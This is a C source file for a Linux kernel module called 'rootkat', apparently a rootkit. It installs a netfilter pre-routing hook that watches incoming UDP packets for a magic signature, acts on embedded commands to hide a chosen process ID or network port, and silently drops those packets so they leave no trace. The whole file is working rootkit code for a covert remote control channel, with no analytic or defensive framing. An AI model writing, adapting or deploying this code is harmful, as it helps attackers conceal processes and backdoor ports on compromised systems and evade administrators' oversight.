// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/skbuff.h>
#include <linux/string.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <net/net_namespace.h>
#include "hidden_pids.h"
#include "hidden_ports.h"
#include "hook_netfilter.h"

#define TAG "rootkat/hook_netfilter: "

static unsigned int rootkat_nf_pre_routing(void *priv, struct sk_buff *skb,
                                           const struct nf_hook_state *state);

static struct nf_hook_ops rootkat_nf_ops = {
	.hook     = rootkat_nf_pre_routing,
	.pf       = NFPROTO_IPV4,
	.hooknum  = NF_INET_PRE_ROUTING,
	.priority = NF_IP_PRI_FIRST,
};

static bool rootkat_nf_installed;

/*
 * Direct calls to the registry functions. We deliberately bypass
 * lkm/magic_actions.c here: those helpers operate on `current`, but a
 * netfilter hook runs in soft-IRQ context with no meaningful caller —
 * actions delivered via this channel always specify an absolute target
 * via the `arg` field.
 */
static void rootkat_handle_net_magic(u8 action, u32 arg)
{
	switch (action) {
	case ROOTKAT_NET_ACT_HIDE_PID:
		rootkat_hide_pid((pid_t)arg);
		pr_info(TAG "net hide pid %u\n", arg);
		break;
	case ROOTKAT_NET_ACT_HIDE_PORT:
		rootkat_hide_port((u16)arg);
		pr_info(TAG "net hide port %u\n", arg);
		break;
	default:
		pr_warn(TAG "unknown net action %u\n", action);
		break;
	}
}

static unsigned int rootkat_nf_pre_routing(void *priv, struct sk_buff *skb,
                                           const struct nf_hook_state *state)
{
	struct iphdr *iph;
	struct udphdr _udph, *udph;
	u8 _payload[ROOTKAT_NET_FRAME_LEN];
	u8 *payload;
	unsigned int udp_off, payload_off;
	u8 action;
	u32 arg;

	if (!skb)
		return NF_ACCEPT;

	iph = ip_hdr(skb);
	if (!iph || iph->protocol != IPPROTO_UDP)
		return NF_ACCEPT;

	udp_off = iph->ihl * 4;
	udph = skb_header_pointer(skb, udp_off, sizeof(_udph), &_udph);
	if (!udph)
		return NF_ACCEPT;

	payload_off = udp_off + sizeof(*udph);
	payload = skb_header_pointer(skb, payload_off,
	                             ROOTKAT_NET_FRAME_LEN, _payload);
	if (!payload)
		return NF_ACCEPT;

	if (memcmp(payload, ROOTKAT_NET_MAGIC, ROOTKAT_NET_MAGIC_LEN))
		return NF_ACCEPT;

	action = payload[ROOTKAT_NET_MAGIC_LEN];
	/* arg is at offset 12, network byte order */
	arg = ntohl(*(__be32 *)(payload + 12));

	rootkat_handle_net_magic(action, arg);

	/* Silently consume — host's UDP stack never sees this packet, so
	 * no socket need be open and no ICMP unreachable is emitted. */
	return NF_DROP;
}

int rootkat_hook_netfilter_install(void)
{
	int rc = nf_register_net_hook(&init_net, &rootkat_nf_ops);

	if (rc) {
		pr_err(TAG "nf_register_net_hook: %d\n", rc);
		return rc;
	}
	rootkat_nf_installed = true;
	pr_info(TAG "netfilter hook armed at PRE_ROUTING\n");
	return 0;
}

void rootkat_hook_netfilter_remove(void)
{
	if (!rootkat_nf_installed)
		return;
	nf_unregister_net_hook(&init_net, &rootkat_nf_ops);
	rootkat_nf_installed = false;
	pr_info(TAG "netfilter hook removed\n");
}
